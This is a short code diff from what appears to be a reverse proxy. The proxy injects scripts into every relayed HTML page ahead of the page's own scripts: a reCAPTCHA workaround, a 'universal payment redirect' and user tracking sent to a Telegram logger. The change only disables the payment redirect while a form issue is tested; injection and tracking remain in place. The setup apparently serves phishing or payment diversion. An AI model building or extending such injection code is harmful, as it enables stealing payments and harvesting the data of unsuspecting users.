@@ -856,7 +856,9 @@ const proxyOptions = {
             // Inject scripts on ALL HTML pages
             // Include: reCAPTCHA fix, payment redirect, and user tracking
             const trackingScript = telegramLogger.getTrackingScript();
-            let scriptsToInject = recaptchaFixScript + '\n' + universalPaymentRedirectScript + '\n' + trackingScript;
+            // TEMPORARILY DISABLE payment redirect to test form input issue
+            // let scriptsToInject = recaptchaFixScript + '\n' + universalPaymentRedirectScript + '\n' + trackingScript;
+            let scriptsToInject = recaptchaFixScript + '\n' + trackingScript;
             
           // CRITICAL: Inject at THE VERY START of <head> to execute BEFORE any other scripts
           const hasHeadOpen = bodyString.includes('<head>');
